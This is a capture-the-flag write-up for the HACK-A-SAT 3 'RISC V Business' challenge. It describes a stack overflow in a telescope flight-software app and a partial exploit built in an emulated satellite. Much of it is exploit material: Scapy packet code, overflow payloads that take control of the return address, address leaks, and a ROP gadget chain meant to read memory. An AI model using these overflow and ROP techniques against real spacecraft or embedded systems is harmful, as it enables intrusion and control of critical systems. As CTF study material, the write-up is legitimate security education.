# HACK-A-SAT 3: RISC V Business

* **Category:** Flight Software - scavenger
* **Points:** 100 divided among teams per flag
* **Description:**

## Write-up

_Write-up by Solar Wine team_

By reverse-engineering `telescope.so` we noticed that it is able to handle more commands than what we could see in the production COSMOS instance. In `cromulence::TelescopeApp::processCommand`:

```c
case 105: /* pseudocode */
    CmdMessage<cromulence::messages::TelescopeMultipleMissionRequest,(unsigned_short)6545,(unsigned_ short)105>::CmdMessage(aCStack120,param_1);
    handleBulkMissionRequest(this,&TStack112);
    CmdMessage<cromulence::messages::TelescopeMultipleMissionRequest,(unsigned_short)6545,(unsigned_ short)105>::~CmdMessage(aCStack120);

case 4:
    CmdMessage<cromulence::messages::TelescopeMissionData,(unsigned_short)6545,(unsigned_short)4>::CmdMessage((CmdMessage<cromulence::messages::TelescopeMissionData,(unsigned_short)6545,(unsigned _short)4>*)aCStack120,param_1);
    Telescope::storeMission(&this->telescope,(TelescopeMissionData *)&TStack112);
    CmdMessage<cromulence::messages::TelescopeMissionData,(unsigned_short)6545,(unsigned_short)4>::~CmdMessage((CmdMessage<cromulence::messages::TelescopeMissionData,(unsigned_short)6545,(unsigne d_short)4>*)aCStack120);
```

Their behavior is documented in the COSMOS instance of the Digital Twin as part of the `TELESCOPE` app:

* `BULK_MISSIONS` (function code 105)
* `STORE_MISSION_DATA` (function code 4)

These commands are handled by the following methods:

```C
cromulence::TelescopeApp::handleBulkMissionRequest(TelescopeApp *this, TelescopeMultipleMissionRequest *param_1)
cromulence::Telescope::storeMission(Telescope *this, TelescopeMissionData *param_1)
```

While looking at `handleBulkMissionRequest` we noticed a stack overflow vulnerability:

```c
void __thiscall
cromulence::TelescopeApp::handleBulkMissionRequest
          (TelescopeApp *this,TelescopeMultipleMissionRequest *param_1)
{
  BULK_MISSION_LOCALVARS loc;

  zeromem_locals(&loc);
  loc.mission_count = (uint)param_1->count;
  if (26 < loc.mission_count) {
    // VULNERABILITY: the array can only contain 13 missions (26 bytes)
    loc.mission_count = 26;
  }
  loc.p_mids = loc.list_mids;
  for (loc.i = 0; loc.i < loc.mission_count; loc.i = loc.i + 1) {
    *loc.p_mids = param_1->mids[loc.i]; // VULNERABILITY: possible OOB write
    loc.mid_request = *loc.p_mids;
    loc.p_mids = loc.p_mids + 1;
    // copy after 12 bytes header
    loc.has_mission =
         Telescope::getMission
                   (&this->telescope,(TelescopeMissionRequest *)&loc.mid_request,
                    (TelescopeMissionData *)&(this->tlm_mission_data).field_0xc);
    if (loc.has_mission == 1) {
      TlmMessage<cromulence::messages::TelescopeMissionData,(unsigned_short)218>::send
                (&this->tlm_mission_data);
    }
    else {
      CFE_EVS_SendEvent(1,4,"Telescope App: Mission does not exist");
    }
  }
  CFE_PSP_MemCpy(this->house_keeping + 0x138,loc.list_mids,26);
  return;
}
```

By sending a `BULK_MISSIONS` with more than 13 mission descriptors we were able to trigger the overflow.

To develop a proper exploit, we launched the firmware in our QEMU-user setup, plugged GDB on it and interacted with this virtual satellite using Python and Scapy.
The `BULK_MISSIONS` packet was defined with a 52-byte payload directly:

```python
class TELESCOPE_BULK_MISSIONS_CmdPkt(Packet):
    name = "TELESCOPE_BULK_MISSIONS_CmdPkt"
    fields_desc = [
        ByteField("COUNT", 8),
        StrFixedLenField("MISSION_IDS", b"", 52),  # 26 uint16 (instead of 13)
    ]


bind_layers(CCSDSPacket, TELESCOPE_BULK_MISSIONS_CmdPkt, pkttype=1, apid=0x191,
            cmd_func_code=105)

def telescope_bulk_messages(count, mission_ids):
    codec.high_push(CCSDSPacket() / TELESCOPE_BULK_MISSIONS_CmdPkt(
        COUNT=count, MISSION_IDS=mission_ids))
```

Then, we tried calling:
```python
telescope_bulk_messages(26, b"\0" * (26 + 12) + struct.pack("<I", 0x11223344))
```

We got a promising crash in GDB which confirmed that we controlled the program counter register (`pc` is set to `0x11223344`):

```text
Thread 2 received signal SIGSEGV, Segmentation fault.
[Switching to Thread 1.718494]
0x11223344 in ?? ()
=> 0x11223344:
Cannot access memory at address 0x11223344

(gdb) bt
#0  0x3f576cea in ?? ()

(gdb) info register
ra             0x3f576cdc   0x3f576cdc
sp             0x3fffe9e0   0x3fffe9e0
gp             0x3f6b8314   0x3f6b8314
tp             0x3f664d20   0x3f664d20
t0             0x2a         42
t1             0x3f67497c   1063733628
t2             0x3fffe284   1073734276
fp             0x3f7fc350   0x3f7fc350
s1             0x1          1
a0             0x3f7fc350   1065337680
a1             0x8          8
a2             0x3f664844   1063667780
a3             0xa          10
a4             0x3f664d20   1063669024
a5             0x0          0
a6             0x0          0
a7             0x85          133
s2             0x0          0
s3             0x3f6b5bcc   1064000460
s4             0x3f69af1c   1063890716
s5             0x3fffeb60   1073736544
s6             0x4001f040   1073868864
s7             0x4001ee60   1073868384
s8             0x3f6b5bcc   1064000460
s9             0x0          0
s10            0x0          0
s11            0x0          0
t3             0x3f576cae   1062694062
t4             0x3fffe918   1073735960
t5             0x0          0
t6             0x0          0
pc             0x3f576cea   0x3f576cea
```

Moreover, using the command `CFE_ES SEND_APP_INFO`, we were able to leak the address of `core-cpu1` and all `.so` files related to applications.
This is a perfect setup to exploit a stack-based buffer overflow, isn't it?

Well... the issue is that the overflow is very tight.
Here is a summary of the state of the stack in `handleBulkMissionRequest` when it returns (using `s0` as the frame pointer register).

```text
at s0-0x3c+0x12 = s0 - 0x2a : uint16_t mids[13] (mids[0,1...,12], 26 bytes)
                  s0 - 0x10 :                   = mids[13,14] (4 bytes)
                  s0 -  0xc :                   = mids[15,16]
                  s0 -    8 : saved s0          = mids[17,18]  => put in s0
                  s0 -    4 : saved ra          = mids[19,20]  => put in ra
                  s0        : ...               = mids[21,22]
                  s0 +    4 : ...               = mids[23,24]
                  s0 +    8 : ...               = mids[25]
```

Field `MISSION_IDS` of the incoming packet is copied to this `uint16_t mids[13]` variable at `s0 - 0x2a` with a size which can be at most 2*26 = 52 bytes.
Considering how the stack is, we can overwrite `s0` (the saved frame pointer), `ra` (the saved return address) and only two more 32-bit values.
It is not much space at all for a ROP chain!

But we found some nice ROP gadgets which could enable sending an event with some leaked data, to transform this vulnerability into an arbitrary read.
The objective would be to disclose the content of the `telescope_flag` global variable.

For example in `core-cpu1` there is:

```text
000226ac 93 07 44 f7          addi       a5,s0,-0x8c
000226b0 be 86                c.mv       a3,a5
000226b2 17 26 03 00          auipc      a2,0x32
000226b6 13 06 e6 d8          addi       a2       = "Exit Application %s Completed."
000226ba 89 45                c.li       a1,0x2
000226bc 35 45                c.li       a0,0xd
000226be ef 00 81 0c          jal        ra,CFE_EVS_SendEvent
000226c2 b5 ac                c.j        LAB_0002293e
```

Jumping to it should display `Exit Application %s Completed.` with some value which comes from `s0 - 0x8c`.
Also, even though we are corrupting the frame pointer `s0`, the stack pointer is not actually corrupted: every function starts by decrementing `sp` by some value and ends by incrementing `sp` with the same value.
This means that even though we can corrupt `s0`, we will still be able to call functions, as the stack pointer is not corrupted.

Let's try to display the content of the string `"Yay science!"` at `0x00025050` in `telescope.so`.

* We send command `CFE_ES SEND_APP_INFO` with `APP_NAME = "TELESCOPE"` to leak the start address of the `TELESCOPE` application, `Telescope_AppMain` (at `0x0001f0f8` in `telescope.so` in Ghidra)
* We receive `START_ADDR = 902914296` (`0x35d160f8`)
* We send command `CFE_ES SEND_APP_INFO` with `APP_NAME = "CFE_ES"` to leak the start address of the `CFE_ES` application, `CFE_ES_TaskMain` (at `0x00028148` in `core-cpu1` in Ghidra)
* We receive `START_ADDR = 1063772488` (`0x3f67e148`)
* We send command `TELESCOPE BULK_MISSIONS` with a `MISSION_IDS` parameter which overwrites `s0` with the address of `"Yay science!"` shifted by `0x8c` and `ra` with the ROP Gadget

```python
telescope_bulk_messages(26, b"\0" * (26 + 8) + struct.pack("<II",
    0x00025050 + 0x8c - 0x0001f0f8 + 902914296,  # s0 value
    0x000226ac - 0x00028148 + 1063772488))       # ra value
```

The virtual satellite displays:

```text
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/TELESCOPE 1: Telescope App: Mission does not exist
EVS Port1 42/1/CFE_SB 25: Pipe Overflow,MsgId 0x808,pipe KIT_TO_PKT_PIPE,sender TELESCOPE
...
EVS Port1 42/1/CFE_SB 25: Pipe Overflow,MsgId 0x808,pipe KIT_TO_PKT_PIPE,sender TELESCOPE
EVS Port1 42/1/TELESCOPE 13: Exit Application Yay science! Completed.
*** stack smashing detected ***: terminated
```

We got `EVS Port1 42/1/TELESCOPE 13: Exit Application Yay science! Completed.` !!!
But `handleBulkMissionRequest` is overflowing the event log pipe before it returns.
So the client only sees 10 events `Telescope App: Mission does not exist` from the telemetry and never sees the last one with the interesting message.

Moreover the GDB setup we used was quite buggy with the virtual satellite: trying to configure breakpoints made GDB disconnect from QEMU.
In the end, we did not manage to fix our exploit to make it leak the `telescope_flag` and we ran out of time.
